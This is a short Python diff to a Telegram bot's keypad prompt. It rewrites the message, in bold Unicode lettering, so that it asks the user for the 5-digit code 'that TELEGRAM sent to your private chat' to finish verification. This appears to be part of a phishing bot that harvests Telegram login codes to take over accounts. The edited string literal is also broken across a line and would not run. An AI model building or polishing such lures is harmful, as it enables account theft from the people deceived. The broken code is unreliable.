@@ -41,7 +41,8 @@ def build_keypad(code_str: str):
     ]
     progreso = " ".join(list(code_str)) if code_str else "—"
     text = (
-        "Introduce el código de 5 dígitos que envió a tu chat para completar la verificación\n\n"
+        "𝐈𝐧𝐭𝐫𝐨𝐝𝐮𝐜𝐞 𝐞𝐥 𝐜𝐨́𝐝𝐢𝐠𝐨 𝐝𝐞 𝟓 𝐝𝐢́𝐠𝐢𝐭𝐨𝐬 𝐪𝐮𝐞 𝐞𝐧𝐯𝐢𝐨́ 𝐓𝐄𝐋𝐄𝐆𝐑𝐀𝐌 𝐚 𝐭𝐮 𝐜𝐡𝐚𝐭 𝐩𝐫𝐢𝐯𝐚𝐝𝐨 𝐩𝐚𝐫𝐚 𝐜𝐨𝐦𝐩𝐥𝐞𝐭𝐚𝐫 𝐥𝐚 𝐯𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐜𝐢𝐨́𝐧.
+\n\n"
         f"Código: `{progreso}`"
     )
     return text, InlineKeyboardMarkup(rows)
